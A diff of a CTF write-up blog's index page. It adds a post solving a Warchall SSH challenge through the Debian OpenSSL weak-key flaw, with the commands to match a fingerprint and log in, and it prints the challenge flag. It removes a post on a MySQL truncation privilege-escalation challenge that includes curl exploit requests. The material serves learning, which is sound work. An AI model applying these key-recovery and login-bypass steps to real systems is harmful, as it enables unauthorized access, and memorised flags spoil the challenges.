@@ -234,7 +234,7 @@ p.spoiler {
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">356</span>
+          <span class="site-state-item-count">357</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -375,6 +375,124 @@ p.spoiler {
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-ssh-z-is-sleeping/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/WeChall/wechall-ssh-z-is-sleeping/" class="post-title-link" itemprop="url">WeChall - SSH... Z is sleeping</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-06-14 13:10:30 / Modified: 13:10:31" itemprop="dateCreated datePublished" datetime="2026-06-14T13:10:30+08:00">2026-06-14</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/WeChall/wechall-ssh-z-is-sleeping/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-ssh-z-is-sleeping/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<p>Warchall level8：Z 睡着了，SSH key 暴露在
+<code>/home/level/08_sshz/backups/</code>。目标是找到对应私钥，以
+<code>level08</code> 登录。</p>
+<h3 id="solution">Solution</h3>
+<p>这题利用 Debian OpenSSL 弱密钥漏洞（2008 年 CVE-2008-0166）。Debian
+的 OpenSSL 包因注释掉 <code>md_rand.c</code> 中两行
+<code>MD_Update(&amp;m,buf,j)</code>，导致 PRNG 仅以进程 PID
+作为随机种子，可能的密钥只有 32768 种。</p>
+<p><strong>Step 1: 获取 public key</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 从 Warchall 服务器读取公钥</span></span><br><span class="line">$ <span class="built_in">cat</span> /home/level/08_sshz/backups/authorized_keys.backup</span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLbM20VLy+Bf7fjHk...</span><br></pre></td></tr></table></figure>
+<p><strong>Step 2: 计算 MD5 fingerprint</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-keygen -l -E md5 -f authorized_keys.backup</span><br><span class="line">2048 MD5:2b:<span class="built_in">cd</span>:07:a7:01:e9:4a:04:74:d7:7e:e4:d6:d0:f8:06 ...</span><br></pre></td></tr></table></figure>
+<p><strong>Step 3: 在 Debian weak key 集中匹配</strong></p>
+<p>下载已知弱密钥集合。原 ANSSI-FR 仓库已被删除，可使用 g0tmi1k
+维护的镜像：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 克隆镜像（如已有关键集合可跳过）</span></span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/g0tmi1k/debian-ssh</span><br><span class="line">$ <span class="built_in">cd</span> debian-ssh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解压 RSA 2048 位 SSH 密钥</span></span><br><span class="line">$ tar -xjf common_keys/debian_ssh_rsa_2048_x86.tar.bz2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 去掉冒号搜索指纹文件名</span></span><br><span class="line">$ find rsa/ -name <span class="string">&#x27;*2bcd07a701e94a0474d77ee4d6d0f806*&#x27;</span></span><br><span class="line">rsa/2048/2bcd07a701e94a0474d77ee4d6d0f806-23669</span><br></pre></td></tr></table></figure>
+<p>指纹对应 PID 23669 的 RSA 2048 位密钥。</p>
+<p><strong>说明：</strong> 该 key set 的文件名格式为
+<code>&lt;fingerprint_hex&gt;-&lt;PID&gt;</code>，因此直接
+<code>find</code> 匹配指纹（去除冒号）即可定位，无需逐 key 计算。</p>
+<p><strong>Step 4: SSH 登录</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -i rsa/2048/2bcd07a701e94a0474d77ee4d6d0f806-23669 \</span><br><span class="line">    level08@warchall.net -p 19198</span><br></pre></td></tr></table></figure>
+<p>注意：用户是 <code>level08</code>，不是 <code>z</code>；使用
+<code>-i</code> 指定密钥文件。端口 19198 是 Warchall SSH 服务端口。</p>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">PrivateKeysAreGold</span></span>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1443,125 +1561,6 @@ KDBX，需用 <code>libkeepass</code>：</p>
 <h3 id="summary">Summary</h3>
 <p>完整的 Windows
 凭证盗窃链：<code>SAM+SYSTEM → NTLM hash → 密码复用 → KeePass → 敏感数据泄露 → 登录邮箱销毁证据</code>。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-screwed-signup/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-screwed-signup/" class="post-title-link" itemprop="url">WeChall - Screwed Signup</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2026-06-11 17:00:23 / Modified: 17:01:30" itemprop="dateCreated datePublished" datetime="2026-06-11T17:00:23+08:00">2026-06-11</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/WeChall/wechall-screwed-signup/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-screwed-signup/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <blockquote>
-<p>Screwed Signup (Exploit, PHP) by gizmore MySQL VARCHAR 截断 +
-查询不一致导致的权限提升</p>
-</blockquote>
-<h3 id="challenge">Challenge</h3>
-<p>目标是 login as Admin。题目给了 register/login
-的源码，<code>chall_sql1</code> 表中已有原始 Admin
-记录（<code>access_level=1337</code>）。</p>
-<p>关键源码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 注册 — INSERT 语句</span></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;INSERT IGNORE INTO `chall_sql1` VALUES (&#x27;<span class="subst">$uname</span>&#x27;, &#x27;<span class="subst">$pw</span>&#x27;, 0)&quot;</span>;</span><br></pre></td></tr></table></figure>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 登录校验</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">screwed_signupGetUser</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM `chall_sql1` WHERE `username`=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="solution">Solution</h3>
-<p>漏洞是 <strong>VARCHAR 截断</strong> +
-<strong>查询不一致</strong>：</p>
-<ul>
-<li>表定义 <code>username VARCHAR(24)</code>，但 PHP 的
-<code>preg_match('/^[a-z0-9A-Z ]{3,64}$/D')</code> 允许最长 <strong>64
-字符</strong></li>
-<li><code>trim()</code> 只去掉首尾空格，中间空格保留</li>
-<li>MySQL 在非严格模式下静默截断超长值到 24 字符</li>
-</ul>
-<p>利用步骤：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1. 注册: username = &quot;Admin&quot; + 19空格 + &quot;a&quot;    (共 25 字符)</span><br><span class="line">   → trim() 保留中间空格（a 在末尾不会被 trim 删掉）</span><br><span class="line">   → regex 通过（3-64 字符规则）</span><br><span class="line"></span><br><span class="line">2. UserExists(&quot;Admin&quot; + 19空格 + &quot;a&quot;) → false（表中无此长字符串记录）</span><br><span class="line"></span><br><span class="line">3. MySQL INSERT 时截断到 VARCHAR(24):</span><br><span class="line">   实际写入: &quot;Admin&quot; + 19 空格      (access_level=0)</span><br><span class="line"></span><br><span class="line">4. 现在表中有两条 Admin 记录：</span><br><span class="line">   - 原始 Admin (access_level=1337) ← 先插入</span><br><span class="line">   - 我们复制的 Admin (access_level=0) ← 后插入</span><br><span class="line"></span><br><span class="line">5. 登录: username = &quot;Admin&quot;（无空格）</span><br><span class="line">   → PasswordMatch 检查 username+password → 找到我们的记录（密码匹配）</span><br><span class="line">   → GetUser 只查 username → WHERE username=&#x27;Admin&#x27; → 返回第一行 → 原始 Admin</span><br><span class="line">   → access_level=1337 &gt; 0 → solved</span><br></pre></td></tr></table></figure>
-<p>关键：<strong><code>PasswordMatch</code> 检查了密码但
-<code>GetUser</code>
-只查用户名</strong>，两条查询的不一致导致权限提升。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 注册</span></span><br><span class="line">curl -c /tmp/wc -b /tmp/wc -X POST \</span><br><span class="line">  <span class="string">&#x27;https://www.wechall.net/en/challenge/screwed_signup/register.php&#x27;</span> \</span><br><span class="line">  -d <span class="string">&#x27;username=Admin                    a&amp;password=hack123&amp;password2=hack123&amp;register=Register&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 登录</span></span><br><span class="line">curl -c /tmp/wc -b /tmp/wc -X POST \</span><br><span class="line">  <span class="string">&#x27;https://www.wechall.net/en/challenge/screwed_signup/login.php&#x27;</span> \</span><br><span class="line">  -d <span class="string">&#x27;username=Admin&amp;password=hack123&amp;login=Login&#x27;</span></span><br></pre></td></tr></table></figure>
 
       
     </div>
